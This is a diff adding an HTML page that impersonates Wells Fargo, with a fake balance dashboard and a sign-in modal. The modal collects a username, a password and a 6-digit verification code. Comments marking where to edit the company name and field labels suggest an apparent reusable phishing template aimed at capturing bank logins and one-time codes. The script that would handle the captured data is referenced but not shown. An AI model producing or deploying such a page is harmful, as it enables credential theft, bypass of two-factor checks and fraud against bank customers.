@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title id="pageTitle">My Local Bank — Secure Access</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="topbar">
+    <div class="top-inner">
+      <!-- === EDIT COMPANY NAME HERE === -->
+      <a class="brand" id="brandName">Wells fargo</a>
+      <nav>
+        <button class="btn-pill" id="openBtn">Sign In</button>
+      </nav>
+    </div>
+  </header>
+
+  <main class="hero">
+    <div class="hero-inner">
+      <div class="hero-copy">
+        <h1 class="headline">Welcome to <span id="brandInHero">Wells Fargo</span></h1>
+        <p class="lead">Simple, modern, secure banking locally.</p>
+        <button class="cta-primary" id="startFlow">Get Started</button>
+      </div>
+
+      <!-- Hero Visual: Mini Dashboard -->
+      <div class="hero-visual">
+        <div class="dashboard-card">
+          <div class="dashboard-header">
+            <span>Account Balance</span>
+            <strong>$20,230.75</strong>
+          </div>
+          <ul class="dashboard-transactions">
+            <li><span>Electric Bill</span><span>-$120.00</span></li>
+            <li><span>Salary</span><span>+$3,000.00</span></li>
+            <li><span>Coffee Shop</span><span>-$5.50</span></li>
+          </ul>
+          <button class="btn-primary dashboard-btn">View More</button>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Modal -->
+  <div id="modal" class="modal hidden">
+    <div class="modal-card">
+      <button class="close" id="closeBtn">✕</button>
+
+      <!-- STEP 1: Sign In -->
+      <section id="step1" class="step active">
+        <h2>Sign In</h2>
+        <form id="loginForm" autocomplete="off">
+          <!-- === EDIT FIELD NAME HERE: Surname / House Color / Security Question === -->
+          <label>Username
+            <input name="username" type="text" required placeholder="Your username">
+          </label>
+          <label>password
+            <input name="password" type="text" required placeholder="Your surname or house color">
+          </label>
+          <div class="row">
+            <button type="submit" class="btn-primary">Continue</button>
+          </div>
+        </form>
+      </section>
+
+      <!-- STEP 2: Verification Code -->
+      <section id="step2" class="step hidden">
+        <h2>Verification Code</h2>
+        <form id="codeForm" autocomplete="off">
+          <label>6-digit code
+            <input name="code" type="text" maxlength="6" pattern="[0-9]{6}" required>
+          </label>
+          <div class="row">
+            <button type="submit" class="btn-primary">Verify</button>
+            <button type="button" class="btn-link" id="backToStep1">Back</button>
+          </div>
+        </form>
+      </section>
+
+      <div id="status" class="muted small"></div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
